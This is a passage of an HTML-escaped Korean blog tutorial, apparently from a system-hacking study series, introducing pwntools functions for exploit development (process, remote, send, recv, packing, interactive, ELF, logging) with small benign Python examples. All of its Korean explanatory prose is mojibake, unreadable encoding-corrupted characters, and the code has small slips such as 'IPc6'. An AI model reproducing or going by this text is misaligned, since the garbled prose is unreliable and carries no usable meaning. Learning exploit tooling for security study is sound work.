      &lt;li&gt;ìƒˆë¡œìš´ í”„ë¡œì„¸ìŠ¤ë¥¼ ìƒˆ ìŠ¤ë ˆë“œì—ì„œ ì‹¤í–‰í•˜ë©´ì„œ, ì»¤ë®¤ë‹ˆì¼€ì´ì…˜ì´ ê°€ëŠ¥í•œ íŠœë¸Œë¡œ ë˜í•‘í•´ ë‘”ë‹¤.&lt;/li&gt;
      &lt;li&gt;ì¦‰, process í•¨ìˆ˜ê°€ ì‹¤í–‰ëœ ì›ë˜ í•¨ìˆ˜ì™€ëŠ” ë³„ê°œì˜ ìŠ¤ë ˆë“œì—ì„œ ì›í•˜ëŠ” í”„ë¡œì„¸ìŠ¤ë¥¼ ì‹¤í–‰í•˜ë©´ì„œ ì›ë˜ í•¨ìˆ˜ì—ì„œ ì „ë‹¬í•˜ë ¤ëŠ” ì¸ìˆ˜ë‚˜ ì‹¤í–‰ëœ í”„ë¡œì„¸ìŠ¤ì˜ ê²°ê³¼ ë“±ì„ ì£¼ê³ ë°›ì„ ìˆ˜ ìˆê²Œ í•´ì¤€ë‹¤.&lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;ì‚¬ìš©ì˜ˆ:&lt;/p&gt;

        &lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;./test&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;print(&apos;this is a shellcode&apos;)&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;timeout&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;0.01&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;        &lt;/div&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;remote [&lt;a href=&quot;http://docs.pwntools.com/en/latest/tubes/sockets.html?highlight=remote#pwnlib.tubes.remote.remote&quot;&gt;ìì„¸í•œ ì„¤ëª…&lt;/a&gt;]
    &lt;ul&gt;
      &lt;li&gt;ì›ê²© ì„œë²„ë¥¼ ëŒ€ìƒìœ¼ë¡œ ìµìŠ¤í”Œë¡œì‡ì„ ì‹¤ì œë¡œ ì‹¤í–‰í•  ë•Œ ì‚¬ìš©í•œë‹¤.&lt;/li&gt;
      &lt;li&gt;TCPë‚˜ UDP ì—°ê²°ì„ ë§Œë“¤ì–´ì„œ í†µì‹ í•˜ê²Œ í•´ ì£¼ê³ , IPv4ì™€ IPc6ë¥¼ ëª¨ë‘ ì§€ì›í•œë‹¤.&lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;ì‚¬ìš©ì˜ˆ:&lt;/p&gt;

        &lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; 
  &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;remote&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;example.com&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;30909&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# &apos;example.com&apos;ì˜ 30909 í¬íŠ¸ì—ì„œ ì„œë¹„ìŠ¤ ì¤‘ì¸ í”„ë¡œì„¸ìŠ¤ë¥¼ ëŒ€ìƒìœ¼ë¡œ ìµìŠ¤ ìˆ˜í–‰
&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;GET /&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;        &lt;/div&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;2-send&quot;&gt;2. send&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;ë°ì´í„°ë¥¼ í”„ë¡œì„¸ìŠ¤ì— ì „ì†¡í•˜ê¸° ìœ„í•´ ì‚¬ìš©í•œë‹¤.&lt;/li&gt;
  &lt;li&gt;ì—¬ëŸ¬ variationì´ ìˆê³ , ê°ì ìƒí™©ì— ë§ê²Œ ì‚¬ìš©í•  ìˆ˜ ìˆë‹¤. [&lt;a href=&quot;http://docs.pwntools.com/en/latest/tubes.html?highlight=send#pwnlib.tubes.tube.tube.send&quot;&gt;ìì„¸í•œ ì„¤ëª…&lt;/a&gt;]&lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;ì‚¬ìš©ì˜ˆ:&lt;/p&gt;

    &lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;./test&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    
  &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;A&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# ./testì— &apos;A&apos;ë¥¼ ì…ë ¥
&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;A&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# &apos;A&apos;+&apos;\n&apos;
&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendafter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;hello&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;A&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# ./testê°€ &apos;hello&apos;ë¥¼ ì¶œë ¥í•˜ë©´ &apos;A&apos;ë¥¼ ì…ë ¥. Dataë¡œëŠ” ë¬´ì¡°ê±´ íŒ¨í‚¹ëœ(ìŠ¤íŠ¸ë§) ë°ì´í„°ê°€ ë“¤ì–´ê°€ì•¼ í•œë‹¤.
&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendlineafter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;hello&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;A&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# ./testê°€ &apos;hello&apos;ë¥¼ ì¶œë ¥í•˜ë©´ &apos;A&apos;+&apos;\n&apos;ì„ ì…ë ¥
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;3-recv&quot;&gt;3. recv&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;í”„ë¡œì„¸ìŠ¤ì—ì„œ ë°ì´í„°ë¥¼ ë°›ê¸° ìœ„í•´ ì‚¬ìš©í•œë‹¤.&lt;/li&gt;
  &lt;li&gt;ì—¬ëŸ¬ variationì´ ìˆê³ , ê°ì ìƒí™©ì— ë§ê²Œ ì‚¬ìš©í•  ìˆ˜ ìˆë‹¤. (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pwnlib.tubes.process&lt;/code&gt; ì˜ í•˜ìœ„ì— ì •ì˜ëœ ë©”ì†Œë“œì´ë‹¤)
    &lt;ul&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;recv()&lt;/code&gt; ì™€ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;recvn()&lt;/code&gt; ì˜ ì°¨ì´ì ì„ ì£¼ì˜í•´ì•¼ í•œë‹¤!
        &lt;ul&gt;
          &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;recv(m)&lt;/code&gt; : ìµœëŒ€ m ë°”ì´íŠ¸ë¥¼ ë°›ëŠ” ê²ƒì´ê¸° ë•Œë¬¸ì—, ê·¸ë§Œí¼ì„ ë°›ì§€ ëª»í•´ë„ ì—ëŸ¬ë¥¼ ë°œìƒì‹œí‚¤ì§€ ì•ŠëŠ”ë‹¤.&lt;/li&gt;
          &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;recvn(m)&lt;/code&gt; : ì •í™•íˆ m ë°”ì´íŠ¸ì˜ ë°ì´í„°ë¥¼ ë°›ëŠ” ê²ƒì´ê¸° ë•Œë¬¸ì— ì¡°ê±´ì„ ë§Œì¡±ì‹œí‚¤ëŠ” ë°ì´í„°ë¥¼ ë°›ì§€ ëª»í•˜ë©´ ê³„ì†í•´ì„œ ê¸°ë‹¤ë¦°ë‹¤.&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;ì‚¬ìš©ì˜ˆ:&lt;/p&gt;

    &lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;./test&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    
  &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# pê°€ ì¶œë ¥í•˜ëŠ” ë°ì´í„°ë¥¼ ìµœëŒ€ 1024 ë°”ì´íŠ¸ê¹Œì§€ ë°›ì„ ìˆ˜ ìˆë‹¤.
&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# store data printed out from p until &apos;\n&apos; comes in
&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# get exactly 5 bytes of data
&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;hello&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# store data printed out from p until &apos;hello&apos; comes in
&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvall&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# store data printed out from p until p is terminated 
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;4-packing--unpacking&quot;&gt;4. packing &amp;amp; unpacking&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;ì›ë˜ ê¸°ëŠ¥ì€ hex â†”Â string&lt;/li&gt;
  &lt;li&gt;ë¶€ê°€ì  ê¸°ëŠ¥ìœ¼ë¡œ ì—”ë””ì–¸ì„ ë°”ê¾¸ëŠ” ë° ì‚¬ìš©í•œë‹¤.&lt;/li&gt;
  &lt;li&gt;íŒ¨í‚¹(hex â†’ string)ì„ ìœ„í•œ í•¨ìˆ˜: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;p32()&lt;/code&gt; , &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;p64()&lt;/code&gt;
    &lt;ul&gt;
      &lt;li&gt;
        &lt;p&gt;ì‚¬ìš©ì˜ˆ: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;p32(int, endian=&apos;big/little&apos;)&lt;/code&gt;&lt;/p&gt;

        &lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
        
  &lt;span class=&quot;n&quot;&gt;s32&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x41424344&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;# p64 ì‚¬ìš©ë²•ì€ ë™ì¼í•˜ë¯€ë¡œ ìƒëµ
&lt;/span&gt;        
  &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# ê²°ê³¼: b&apos;DCBA&apos;
&lt;/span&gt;  &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;endian&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;big&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# íŒŒë¼ë¯¸í„° ì¶”ê°€ ëª…ì‹œë¡œ ì—”ë””ì–¸ ë³€ê²½ ê°€ëŠ¥. ê²°ê³¼: b&apos;ABCD&apos;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;        &lt;/div&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;ì–¸íŒ¨í‚¹(string â†’ hex)ì„ ìœ„í•œ í•¨ìˆ˜: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;u32()&lt;/code&gt; , &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;u64()&lt;/code&gt;
    &lt;ul&gt;
      &lt;li&gt;
        &lt;p&gt;ì‚¬ìš©ì˜ˆ: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;u32((uint32_t*)addr, endian=â€™big/littleâ€™)&lt;/code&gt; , ë¦¬í„´ê°’ì€ int í˜•ì‹.&lt;/p&gt;

        &lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
        
  &lt;span class=&quot;n&quot;&gt;s32&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;ABCD&quot;&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;# s64 ì‚¬ìš©ë²•ì€ ë™ì¼í•˜ë¯€ë¡œ ìƒëµ
&lt;/span&gt;        
  &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;u32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# ê²°ê³¼: 0x44434241
&lt;/span&gt;  &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;u32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;endian&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;big&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# ê²°ê³¼: 0x41424344
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;        &lt;/div&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;5-interactive&quot;&gt;5. interactive&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;ì…¸ì„ íšë“í–ˆê±°ë‚˜, ìµìŠ¤í”Œë¡œì‡ì˜ íŠ¹ì • ìƒí™©ì— ì§ì ‘ ì…ë ¥ì„ ì£¼ë©´ì„œ ì¶œë ¥ì„ í™•ì¸í•˜ê³  ì‹¶ì„ ë•Œ ì‚¬ìš©í•˜ëŠ” í•¨ìˆ˜.
    &lt;ul&gt;
      &lt;li&gt;ìŒë°© ì„¸ì…˜ì„ ìƒì„±í•´ ì¤€ë‹¤.&lt;/li&gt;
      &lt;li&gt;ì‹¤ì œë¡œ í˜¸ì¶œí•˜ë©´ í„°ë¯¸ë„ì´ ëœ¨ê²Œ ë˜ê³ , ê±°ê¸°ì—ì„œ ì…ë ¥ ë° ì¶œë ¥ì´ ê°€ëŠ¥í•˜ë‹¤.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;pwnlib.tubes.ssh.ssh.interactiveì´ê³ , processë‚˜ remoteë¥¼ ì‚¬ìš©í•˜ë©´ì„œ ê·¸ í•˜ìœ„ ë©”ì†Œë“œë¡œ ì´ìš©í•  ìˆ˜ ìˆë‹¤.&lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;ì‚¬ìš©ì˜ˆ:&lt;/p&gt;

    &lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;./test&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;6-elf&quot;&gt;6. ELF&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://toubva.github.io/blog/system-hacking-step3-1/&quot;&gt;ì•ì„œ ë³´ì•˜ë“¯&lt;/a&gt;, ELF íŒŒì¼ì˜ í—¤ë”ì—ëŠ” ê°ì¢… ì •ë³´ê°€ ê¸°ë¡ë˜ì–´ ìˆê³ , ì´ë“¤ì€ ë†’ì€ í™•ë¥ ë¡œ ìµìŠ¤í”Œë¡œì‡ì— ì‚¬ìš©í•  ìˆ˜ ìˆë‹¤.&lt;/li&gt;
  &lt;li&gt;pwntoolsê°€ ì´ëŸ° ì •ë³´ë“¤ì„ ì‰½ê²Œ ì°¸ì¡°í•  ìˆ˜ ìˆë„ë¡ ë³´ì¡°í•´ ì¤€ë‹¤.&lt;/li&gt;
  &lt;li&gt;[&lt;a href=&quot;http://docs.pwntools.com/en/latest/elf/elf.html?highlight=ELF&quot;&gt;ìì„¸í•œ ë©”ì†Œë“œì™€ ì‚¬ìš©ì˜ˆ&lt;/a&gt;]&lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;ì‚¬ìš©ì˜ˆ:&lt;/p&gt;

    &lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ELF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;./test&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    
  &lt;span class=&quot;c1&quot;&gt;# ì´í•˜ ELF ë©”ì†Œë“œì— ì •ì˜ëœ í•˜ìœ„ ë©”ì†Œë“œë“¤ ì‚¬ìš© ê°€ëŠ¥
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;7-contextlog&quot;&gt;7. context.log&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;ì‘ì„±í•œ ìµìŠ¤í”Œë¡œì‡ë„ ë””ë²„ê¹…ì´ í•„ìš”í•œë°, ì´ë•Œ ì‚¬ìš©í•˜ëŠ” ë¡œê¹… ê¸°ëŠ¥&lt;/li&gt;
  &lt;li&gt;ë¡œê·¸ ë ˆë²¨ì€ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;context.log_level&lt;/code&gt; ì— íŠ¹ì • ê°’ì„ í• ë‹¹í•¨ìœ¼ë¡œì¨ ì¡°ì ˆ ê°€ëŠ¥í•˜ë‹¤&lt;/li&gt;
